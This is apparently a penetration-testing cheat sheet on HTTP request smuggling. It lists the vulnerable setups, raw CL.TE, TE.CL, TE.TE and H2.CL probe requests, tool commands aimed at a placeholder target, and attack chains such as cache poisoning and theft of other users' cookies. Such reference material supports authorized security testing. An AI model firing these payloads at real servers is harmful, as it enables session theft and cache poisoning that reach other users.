# HTTP Request Smuggling Techniques

> HTTP request smuggling — exploiting parsing discrepancies between front-end proxies and back-end servers to desynchronize the connection and poison subsequent requests.

## Surface

- Any site behind a reverse proxy or CDN (Cloudflare, Nginx, HAProxy, Varnish, AWS ALB)
- Load-balanced applications where front-end and back-end disagree on body length
- HTTP/1.1 endpoints — `Transfer-Encoding: chunked` vs `Content-Length` ambiguity
- HTTP/2 downgrade scenarios — H2.CL and H2.TE
- WebSocket upgrade paths and HTTP/2 cleartext (h2c) upgrade requests

## Test Approach

1. **Detect with timing** — CL.TE: send a request where CL says body is complete but TE has a leftover chunk; if 10s+ delay, likely vulnerable:
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 6
   Transfer-Encoding: chunked

   0

   X
   ```
2. **Confirm with differential response** — smuggle a partial request, send a normal follow-up, check if it gets garbled:
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 49
   Transfer-Encoding: chunked

   e
   q=smuggling&x=
   0

   GET /404-doesnt-exist HTTP/1.1
   X-Foo: x
   ```
3. **Use HTTP Request Smuggler** (Burp extension) — automated detection of CL.TE, TE.CL, TE.TE, H2.CL, H2.TE
4. **H2.CL smuggling** — HTTP/2 request with `content-length` header forcing back-end to read extra bytes:
   - Use Burp's HTTP/2 raw editor to inject `content-length: <wrong value>`
5. **Test header obfuscation** for TE.TE:
   ```
   Transfer-Encoding: xchunked
   Transfer-Encoding: chunked
   Transfer-Encoding : chunked
   Transfer-Encoding[tab]: chunked
   ```
6. **Exploit: poison next user's request** — prepend a malicious partial request that modifies the next victim's headers

## Tools

- **HTTP Request Smuggler** (Burp extension) — automated CL.TE/TE.CL/H2.CL/H2.TE detection
- **Smuggler.py** — CLI smuggling prober: `python3 smuggler.py -u https://target.com`
- **turbo-intruder** — high-speed parallel requests for timing-based confirmation
- **nuclei** — smuggling detection templates: `nuclei -t http-request-smuggling/ -u https://target.com`

## Payloads / Probes

```http
# CL.TE timing probe
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

# TE.CL confirmation
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# TE.TE obfuscation variants
Transfer-Encoding: chunked, chunked
X-Transfer-Encoding: chunked
Transfer-encoding: chunked

# H2.CL (HTTP/2 — inject via Burp raw editor)
:method POST
content-length: 0
# Body contains injected CL mismatch
```

## Chain Opportunities

- **Smuggling → cache poisoning** — poison CDN cache with malicious response served to other users
- **Smuggling → request capture** — steal other users' cookies/tokens from absorbed requests
- **Smuggling → auth bypass** — prepend headers that bypass front-end access controls
- **Smuggling → reflected XSS escalation** — turn self-XSS into cross-user XSS
- **H2.TE → WebSocket hijack** — inject into upgrade path

## Recent Intel

- **HTTP/1.1 must die** · CL.TE/TE.CL vulnerabilities persist despite years of mitigations; defenses are bypassable, migration to HTTP/2+ is the only real fix · https://portswigger.net/research/http1-must-die
- **HTTP Anomaly Rank** · Burp research tool using statistical deviation to auto-triage smuggling/desync responses in large-scale fuzzing · https://portswigger.net/research/introducing-http-anomaly-rank
- **H2.CL smuggling (2023)** · HTTP/2 cleartext downgrade exploited in multiple CDN configurations; HAProxy + Nginx combinations particularly prone to H2.TE variants
